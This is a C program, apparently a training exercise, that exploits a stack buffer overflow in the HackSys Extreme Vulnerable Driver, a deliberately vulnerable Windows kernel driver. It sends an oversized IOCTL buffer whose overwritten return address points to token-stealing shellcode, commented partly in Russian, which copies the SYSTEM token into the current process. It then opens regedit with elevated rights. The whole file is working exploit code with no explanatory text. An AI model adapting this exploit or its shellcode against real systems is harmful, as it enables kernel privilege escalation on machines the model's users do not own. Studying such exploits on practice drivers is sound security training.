#include <stdio.h>
#include <windows.h>

int main() {
    HANDLE hDriver;
    LPVOID ptr;
    DWORD bufLength;
    DWORD BytesReturned;

    hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver_mbks", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    unsigned char shellcode[] =
        "\x60"                  // pushad
        "\x31\xc0"              // xor eax,eax

        "\x64\x8b\x80\x24\x01\x00\x00"  // mov eax,[fs:eax+0x124] // токен текущего процесса
        "\x8b\x40\x50"          // mov eax,[eax+0x50]
        "\x89\xc1"              // mov ecx,eax
        "\xba\x04\x00\x00\x00"  // mov edx,0x4 // system pid
        "\x8b\x80\xb8\x00\x00\x00"  // mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"  // sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"  // cmp [eax+0xb4],edx // поиск токена system
        "\x75\xed"              // jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"  // mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"  // mov [ecx+0xf8],edx // перезапись
        "\x61"                  // popad
        "\x31\xc0"              // xor eax,eax
        "\x5d"                  // pop ebp
        "\xc2\x08\x00";          // ret 0x8

    ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(ptr, shellcode, sizeof(shellcode));

    bufLength = 2080 + sizeof(ptr);
    char* InBuffer = (char*)malloc(bufLength);
    memset(InBuffer, 'A', 2080);
    memcpy(InBuffer + 2080, &ptr, sizeof(ptr));

    DeviceIoControl(hDriver, 0x222403, InBuffer, bufLength, NULL, 0, &BytesReturned, NULL);
    system("start regedit");

    CloseHandle(hDriver);
    VirtualFree(ptr, 0, MEM_RELEASE);
    free(InBuffer);

    return 0;
}
